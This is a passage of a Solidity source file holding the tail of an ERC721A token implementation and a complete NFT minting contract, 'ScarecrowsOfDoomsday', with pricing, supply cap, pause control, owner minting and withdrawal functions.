1045         bytes memory _data
1046     ) public override {
1047         _transfer(from, to, tokenId);
1048         require(
1049             _checkOnERC721Received(from, to, tokenId, _data),
1050             "ERC721A: transfer to non ERC721Receiver implementer"
1051         );
1052     }
1053 
1054     /**
1055      * @dev Returns whether `tokenId` exists.
1056      *
1057      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1058      *
1059      * Tokens start existing when they are minted (`_mint`),
1060      */
1061     function _exists(uint256 tokenId) internal view returns (bool) {
1062         return tokenId < currentIndex;
1063     }
1064 
1065     function _safeMint(address to, uint256 quantity) internal {
1066         _safeMint(to, quantity, "");
1067     }
1068 
1069     /**
1070      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1071      *
1072      * Requirements:
1073      *
1074      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1075      * - `quantity` must be greater than 0.
1076      *
1077      * Emits a {Transfer} event.
1078      */
1079     function _safeMint(
1080         address to,
1081         uint256 quantity,
1082         bytes memory _data
1083     ) internal {
1084         _mint(to, quantity, _data, true);
1085     }
1086 
1087     /**
1088      * @dev Mints `quantity` tokens and transfers them to `to`.
1089      *
1090      * Requirements:
1091      *
1092      * - `to` cannot be the zero address.
1093      * - `quantity` must be greater than 0.
1094      *
1095      * Emits a {Transfer} event.
1096      */
1097     function _mint(
1098         address to,
1099         uint256 quantity,
1100         bytes memory _data,
1101         bool safe
1102     ) internal {
1103         uint256 startTokenId = currentIndex;
1104         require(to != address(0), "ERC721A: mint to the zero address");
1105         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1106 
1107         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1108 
1109         // Overflows are incredibly unrealistic.
1110         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1111         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1112         unchecked {
1113             _addressData[to].balance += uint128(quantity);
1114             _addressData[to].numberMinted += uint128(quantity);
1115 
1116             _ownerships[startTokenId].addr = to;
1117             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1118 
1119             uint256 updatedIndex = startTokenId;
1120 
1121             for (uint256 i; i < quantity; i++) {
1122                 emit Transfer(address(0), to, updatedIndex);
1123                 if (safe) {
1124                     require(
1125                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1126                         "ERC721A: transfer to non ERC721Receiver implementer"
1127                     );
1128                 }
1129 
1130                 updatedIndex++;
1131             }
1132 
1133             currentIndex = updatedIndex;
1134         }
1135 
1136         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1137     }
1138 
1139     /**
1140      * @dev Transfers `tokenId` from `from` to `to`.
1141      *
1142      * Requirements:
1143      *
1144      * - `to` cannot be the zero address.
1145      * - `tokenId` token must be owned by `from`.
1146      *
1147      * Emits a {Transfer} event.
1148      */
1149     function _transfer(
1150         address from,
1151         address to,
1152         uint256 tokenId
1153     ) private {
1154         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1155 
1156         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1157             getApproved(tokenId) == _msgSender() ||
1158             isApprovedForAll(prevOwnership.addr, _msgSender()));
1159 
1160         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1161 
1162         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1163         require(to != address(0), "ERC721A: transfer to the zero address");
1164 
1165         _beforeTokenTransfers(from, to, tokenId, 1);
1166 
1167         // Clear approvals from the previous owner
1168         _approve(address(0), tokenId, prevOwnership.addr);
1169 
1170         // Underflow of the sender's balance is impossible because we check for
1171         // ownership above and the recipient's balance can't realistically overflow.
1172         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1173         unchecked {
1174             _addressData[from].balance -= 1;
1175             _addressData[to].balance += 1;
1176 
1177             _ownerships[tokenId].addr = to;
1178             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1179 
1180             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1181             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1182             uint256 nextTokenId = tokenId + 1;
1183             if (_ownerships[nextTokenId].addr == address(0)) {
1184                 if (_exists(nextTokenId)) {
1185                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1186                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1187                 }
1188             }
1189         }
1190 
1191         emit Transfer(from, to, tokenId);
1192         _afterTokenTransfers(from, to, tokenId, 1);
1193     }
1194 
1195     /**
1196      * @dev Approve `to` to operate on `tokenId`
1197      *
1198      * Emits a {Approval} event.
1199      */
1200     function _approve(
1201         address to,
1202         uint256 tokenId,
1203         address owner
1204     ) private {
1205         _tokenApprovals[tokenId] = to;
1206         emit Approval(owner, to, tokenId);
1207     }
1208 
1209     /**
1210      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1211      * The call is not executed if the target address is not a contract.
1212      *
1213      * @param from address representing the previous owner of the given token ID
1214      * @param to target address that will receive the tokens
1215      * @param tokenId uint256 ID of the token to be transferred
1216      * @param _data bytes optional data to send along with the call
1217      * @return bool whether the call correctly returned the expected magic value
1218      */
1219     function _checkOnERC721Received(
1220         address from,
1221         address to,
1222         uint256 tokenId,
1223         bytes memory _data
1224     ) private returns (bool) {
1225         if (to.isContract()) {
1226             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1227                 return retval == IERC721Receiver(to).onERC721Received.selector;
1228             } catch (bytes memory reason) {
1229                 if (reason.length == 0) {
1230                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1231                 } else {
1232                     assembly {
1233                         revert(add(32, reason), mload(reason))
1234                     }
1235                 }
1236             }
1237         } else {
1238             return true;
1239         }
1240     }
1241 
1242     /**
1243      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1244      *
1245      * startTokenId - the first token id to be transferred
1246      * quantity - the amount to be transferred
1247      *
1248      * Calling conditions:
1249      *
1250      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1251      * transferred to `to`.
1252      * - When `from` is zero, `tokenId` will be minted for `to`.
1253      */
1254     function _beforeTokenTransfers(
1255         address from,
1256         address to,
1257         uint256 startTokenId,
1258         uint256 quantity
1259     ) internal virtual {}
1260 
1261     /**
1262      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1263      * minting.
1264      *
1265      * startTokenId - the first token id to be transferred
1266      * quantity - the amount to be transferred
1267      *
1268      * Calling conditions:
1269      *
1270      * - when `from` and `to` are both non-zero.
1271      * - `from` and `to` are never both zero.
1272      */
1273     function _afterTokenTransfers(
1274         address from,
1275         address to,
1276         uint256 startTokenId,
1277         uint256 quantity
1278     ) internal virtual {}
1279 }
1280 
1281 contract ScarecrowsOfDoomsday is ERC721A, Ownable, ReentrancyGuard {
1282     string public baseURI = "ipfs://bafybeic23pvqiogogl5sesyywv7vzv4hvc7xm3bsd4dtz3ybqos5w6kiuu/";
1283     uint   public price             = 0.005 ether;
1284     uint   public maxPerTx          = 6;
1285     uint   public maxPerFree        = 0;
1286     uint   public totalFree         = 0;
1287     uint   public maxSupply         = 3333;
1288     bool   public paused            = true;
1289 
1290     mapping(address => uint256) private _mintedFreeAmount;
1291 
1292     constructor() ERC721A("Scarecrows Of Doomsday", "SoD"){}
1293 
1294     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1295         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1296         string memory currentBaseURI = _baseURI();
1297         return bytes(currentBaseURI).length > 0
1298             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1299             : "";
1300     }
1301 
1302     function mint(uint256 count) external payable {
1303         uint256 cost = price;
1304         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1305             (_mintedFreeAmount[msg.sender] < maxPerFree));
1306 
1307         if (isFree) {
1308             require(!paused, "The contract is paused!");
1309             require(msg.value >= (count * cost) - cost, "INVALID_ETH");
1310             require(totalSupply() + count <= maxSupply, "Not enough supply.");
1311             require(count <= maxPerTx, "Max per TX reached.");
1312             _mintedFreeAmount[msg.sender] += count;
1313         }
1314         else{
1315         require(!paused, "The contract is paused!");
1316         require(msg.value >= count * cost, "Send the exact amount: 0.004*(count)");
1317         require(totalSupply() + count <= maxSupply, "Not enough supply.");
1318         require(count <= maxPerTx, "Max per TX reached.");
1319         }
1320 
1321         _safeMint(msg.sender, count);
1322     }
1323 
1324     function kingMint(address mintAddress, uint256 count) public onlyOwner {
1325         _safeMint(mintAddress, count);
1326     }
1327 
1328     function setPaused(bool _state) public onlyOwner {
1329     paused = _state;
1330     }
1331 
1332     function _baseURI() internal view virtual override returns (string memory) {
1333         return baseURI;
1334     }
1335 
1336     function setBaseUri(string memory baseuri_) public onlyOwner {
1337         baseURI = baseuri_;
1338     }
1339 
1340     function setPrice(uint256 price_) external onlyOwner {
1341         price = price_;
1342     }
1343 
1344     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1345         totalFree = MaxTotalFree_;
1346     }
1347 
1348     function withdraw() external onlyOwner nonReentrant {
1349         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1350         require(success, "Transfer failed.");
1351     }
1352 }